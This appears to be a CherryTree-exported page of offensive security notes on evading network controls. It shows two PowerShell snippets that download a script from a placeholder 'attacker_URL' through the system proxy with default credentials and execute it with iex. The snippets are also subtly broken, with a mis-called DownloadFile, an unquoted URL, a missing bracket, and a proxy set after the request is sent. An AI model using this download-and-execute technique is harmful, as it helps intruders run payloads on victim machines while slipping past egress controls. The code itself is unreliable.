<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Evasion: download file to disk</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Evasion: download file to disk</h1><br/><br />• <strong>Use proxy with default credentials</strong><br />   ◇ Net.WebClient class<br />       <div class="codebox"><div class="codebox">PS&gt;&nbsp;$downloader&nbsp;=&nbsp;New-Object&nbsp;System.Net.WebClient<br />PS&gt;&nbsp;$payload&nbsp;=&nbsp;http://attacker_URL/script.ps1<br />PS&gt;&nbsp;$cmd&nbsp;=&nbsp;$downloader.DownloadFile($payload)<br />PS&gt;&nbsp;$proxy&nbsp;=&nbsp;[Net.WebRequest]::GetSystemWebProxy()<br />PS&gt;&nbsp;$proxy.Credentials&nbsp;=&nbsp;[Net.CredentialCache]::DefaultCredentials<br />PS&gt;&nbsp;$downloader.Proxy&nbsp;=&nbsp;$proxy<br />PS&gt;&nbsp;iex&nbsp;$cmd</div></div><br />   ◇ Net.WebRequest class<br />       <div class="codebox"><div class="codebox">PS&gt;&nbsp;$req&nbsp;=&nbsp;[System.Net.WebRequest]::Create(&quot;http://attacker_URL/script.ps1&quot;)<br />PS&gt;&nbsp;$res&nbsp;=&nbsp;$req.GetResponse()<br />PS&gt;&nbsp;$proxy&nbsp;=&nbsp;[Net.WebRequest::GetSystemWebProxy()<br />PS&gt;&nbsp;$proxy.Credentials&nbsp;=&nbsp;[Net.CredentialCache]::DefaultCredentials<br />PS&gt;&nbsp;$req.Proxy&nbsp;=&nbsp;$proxy<br />PS&gt;&nbsp;iex&nbsp;([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd<span style="color:#000000;font-weight:400">()</span></div></div><br /><br /></div>
</body>
</html>
